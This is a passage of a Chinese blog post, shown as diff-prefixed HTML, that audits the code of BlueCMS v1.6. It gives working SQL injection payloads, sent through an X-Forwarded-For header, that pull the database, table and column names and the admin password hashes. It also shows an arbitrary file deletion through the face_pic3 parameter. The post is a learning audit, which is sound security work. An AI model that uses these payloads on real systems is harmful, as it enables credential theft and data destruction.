class="string">&#x27;comment_is_check&#x27;</span>] == <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;请稍候，您的评论正在审核当中...&#x27;</span>,<span class="string">&#x27;comment.php?id=&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&amp;type=&#x27;</span>.<span class="variable">$type</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;发布评论成功&#x27;</span>,<span class="string">&#x27;comment.php?id=&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&amp;type=&#x27;</span>.<span class="variable">$type</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>comment.php</code> 中直接将 <code>getip()</code> 插入数据库语句中，没有过滤就执行了，这里存在sql注入</p>
+<blockquote>
+<p>首先需要构造闭合将第一次插入的IP和is_check补全，然后构造二次插入，要闭合原本语句的单引号</p>
+</blockquote>
+<h5 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload</span></span><br><span class="line"><span class="comment">//原始语句</span></span><br><span class="line">INSERT INTO <span class="title function_ invoke__">blue_comment</span> (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;qwe&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造的payload最终在数据中的效果</span></span><br><span class="line">INSERT INTO <span class="title function_ invoke__">blue_comment</span> (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) <span class="title function_ invoke__">VALUES</span> (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;asd&#x27;</span>,<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,(<span class="title function_ invoke__">database</span>()),<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(database()),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>burp抓包修改</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261536159.png" alt="image-20230726153635061"></p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261537891.png" alt="image-20230726153741832"></p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261538760.png" alt="image-20230726153812695"></p>
+<p>可以看到 <code>content</code> 为回显位，构造payload即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取库名为bluecms</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(database()),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261540597.png" alt="image-20230726154042529"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取表名</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261544095.png" alt="image-20230726154405023"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取字段名</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261548997.png" alt="image-20230726154808924"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取admin字段信息</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(select group_concat(admin_name,0x3a, pwd) from blue_admin),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261550017.png" alt="image-20230726155024940"></p>
+<h4 id="7、任意文件删除"><a href="#7、任意文件删除" class="headerlink" title="7、任意文件删除"></a>7、任意文件删除</h4><p>漏洞点: <code>user.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span> == <span class="string">&#x27;edit_user_info&#x27;</span>)&#123;</span><br><span class="line"> <span class="variable">$user_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$user_id</span>))&#123;</span><br><span class="line">	 <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$birthday</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;birthday&#x27;</span>]);</span><br><span class="line"><span class="variable">$sex</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sex&#x27;</span>]);</span><br><span class="line">   <span class="variable">$email</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$msn</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msn&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msn&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$qq</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qq&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qq&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$mobile_phone</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mobile_phone&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mobile_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$office_phone</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;office_phone&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;office_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$home_phone</span>   = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;home_phone&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;home_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$address</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic1&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic1&#x27;</span>], <span class="string">&#x27;http://&#x27;</span>) != <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic1&#x27;</span>], <span class="string">&#x27;https://&#x27;</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">          <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;只支持本站相对路径地址&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$face_pic</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic1&#x27;</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(BLUE_ROOT.<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic3&#x27;</span>]))&#123;</span><br><span class="line">		@<span class="title function_ invoke__">unlink</span>(BLUE_ROOT.<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic3&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>edit_user_info</code> 更新个人信息中，直接调用 unlink 函数删除 <code>$_POST[&#39;face_pic3&#39;]</code>，没有进行相应的检查，导致任意文件删除漏洞</p>
+<p>访问 <code>user.php</code> 并且抓包修改<code>act=edit_user_info</code>  ，post添加 <code>face_pic3</code> 成功删除根目录下的flag.txt</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261619560.png" alt="image-20230726161909476"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
+<p>第一次做CMS代码审计，感觉这套CMS还有很多洞，但是这里没有继续深挖了，自己对PHP的知识还是有点不够，有些代码逻辑还得问问神奇的GPT，之前的PHP知识并不足以支持我审计一套CMS，还得继续学习下PHP相关的知识</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">主页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/about/">关于我</a></li>
+        
+          <li><a href="/friends/">友链</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%89%8D%E5%8F%B0Union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、SQL注入：前台Union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、SQL注入：后台登录万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%90%8E%E5%8F%B0Union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、SQL注入：后台Union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81XSS%EF%BC%9A%E5%90%8E%E5%8F%B0%E6%96%B0%E9%97%BB%E5%8F%91%E5%B8%83%E5%A4%84%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.2.4.</span> <span class="toc-text">4、XSS：后台新闻发布处存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.5.</span> <span class="toc-text">5、文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%9AXFF%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.6.</span> <span class="toc-text">6、SQL注入：XFF头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">1.2.7.</span> <span class="toc-text">7、任意文件删除</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&text=代码审计：BlueCMSv1.6"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&is_video=false&description=代码审计：BlueCMSv1.6"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=代码审计：BlueCMSv1.6&body=Check out this article: http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&name=代码审计：BlueCMSv1.6&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&t=代码审计：BlueCMSv1.6"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2023
+    Dp0rt
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">主页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于我</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?10fa76be4e0bcbe27fe2b846f242343e";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
